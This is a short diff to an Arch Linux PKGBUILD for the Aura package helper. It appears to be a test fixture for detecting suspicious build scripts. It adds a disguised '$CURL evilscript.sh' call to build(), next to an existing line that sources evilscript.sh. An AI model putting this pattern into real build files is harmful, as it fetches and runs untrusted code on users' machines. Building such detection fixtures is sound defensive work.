@@ -8,6 +8,7 @@ url="https://github.com/fosskers/aura"
 license=('GPL-3')
 arch=('i686' 'x86_64')
 depends=('gmp' 'pacman' 'pcre')
+CURL=curl
 makedepends=('ghc'
              'haskell-aur>=6.0'
              'haskell-mtl'
@@ -39,6 +40,7 @@ build() {
     cd .
     . evilscript.sh
     git branch foobar
+    $CURL evilscript.sh
 }
 
 package() {
